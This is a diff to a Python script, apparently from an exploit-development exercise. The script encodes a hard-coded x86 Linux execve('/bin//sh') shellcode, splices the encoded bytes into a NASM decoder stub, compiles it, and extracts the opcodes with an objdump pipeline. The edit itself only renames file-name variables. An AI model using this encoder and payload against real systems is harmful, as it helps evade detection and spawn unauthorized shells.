@@ -3,6 +3,7 @@
 import random
 import sys, os
 
+file_name = 'decoder'
 
 def get_stop_code(shellcode):
 	list_codes = bytearray(shellcode)
@@ -40,8 +41,7 @@ def encode_shellcode(shellcode, hex_stop_code):
 
 
 def create_new_file(hex_stop_code, encoded2):
-	file_name = 'decoder.nasm'
-	lines = open(file_name).read().splitlines()
+	lines = open(file_name+".nasm").read().splitlines()
 	new_file_lines = []
 	for l in lines:
 		if l.endswith("marker1"):
@@ -56,16 +56,18 @@ def create_new_file(hex_stop_code, encoded2):
 			new_file_lines.append(new_l)
 		else:
 			new_file_lines.append(l)
-	open(file_name,'w').write('\n'.join(new_file_lines))
+	open(file_name+".nasm",'w').write('\n'.join(new_file_lines))
 
-def compile(file_name):
-	os.system("nasm -f elf32 -o "+file_name+".o "+file_name+".nasm")
-	os.system("ld  -m elf_i386 -o "+file_name+" "+file_name+".o")
-	os.system("rm "+file_name+".o")
+
+def compile(fname):
+	os.system("nasm -f elf32 -o "+fname+".o "+fname+".nasm")
+	os.system("ld  -m elf_i386 -o "+fname+" "+fname+".o")
+	os.system("rm "+fname+".o")
+
 
 def create_new_file_shellcode(shellcode):
-	file_name = 'shellcode.c'
-	lines = open(file_name).read().splitlines()
+	fname = 'shellcode.c'
+	lines = open(fname).read().splitlines()
 	new_file_lines = []
 	for l in lines:
 		if l.endswith("marker3"):
@@ -75,19 +77,16 @@ def create_new_file_shellcode(shellcode):
 			new_file_lines.append(new_l)
 		else:
 			new_file_lines.append(l)
-	open(file_name,'w').write('\n'.join(new_file_lines))
+	open(fname,'w').write('\n'.join(new_file_lines))
 
 	
-
 def main():
 	shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 	stop_code = get_stop_code(shellcode)
 	hex_stop_code = '{:02X}'.format(stop_code).lower()
-	
 	encoded2 = encode_shellcode(shellcode, hex_stop_code)
 	create_new_file(hex_stop_code, encoded2)
 	
-	file_name = "decoder"
 	compile(file_name)
 	cmd = "objdump -d ./"+file_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
 	shellcode = os.popen(cmd).read().splitlines()[0]
